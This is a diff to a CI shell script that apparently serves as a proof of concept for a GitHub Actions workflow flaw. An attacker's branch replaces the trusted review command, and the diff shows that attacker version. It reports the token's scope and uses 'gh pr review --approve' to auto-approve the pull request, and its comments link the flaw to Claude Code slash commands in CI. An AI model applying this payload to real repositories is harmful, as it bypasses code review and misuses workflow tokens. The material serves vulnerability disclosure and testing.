@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
-# Trusted/base-branch version of the "review command" the workflow executes.
-# In the real vulnerable workflows, this is a Claude Code project slash
-# command (.claude/commands/review-pr-ci.md etc.) instead of a shell script,
-# but it is read from the same checked-out working directory either way.
+# "Attacker-controlled" version of .github/commands/review.sh, shipped ONLY
+# on the attacker-pr branch/fork. This is the entire payload: a one-line
+# change to a file that the base workflow's maintainer never reviews before
+# dispatching, because the dispatch UI only takes a PR number.
 set -euo pipefail
-echo "Legitimate review: no issues found for PR #$PR_NUMBER."
+echo "::notice::PoC payload executing with token scoped to: $(gh api /repos/${GITHUB_REPOSITORY} --jq .full_name 2>/dev/null || echo unknown)"
+gh pr review "$PR_NUMBER" --approve --body "Auto-approved by the PoC payload in .github/commands/review.sh — this text was never reviewed, only the PR number was."
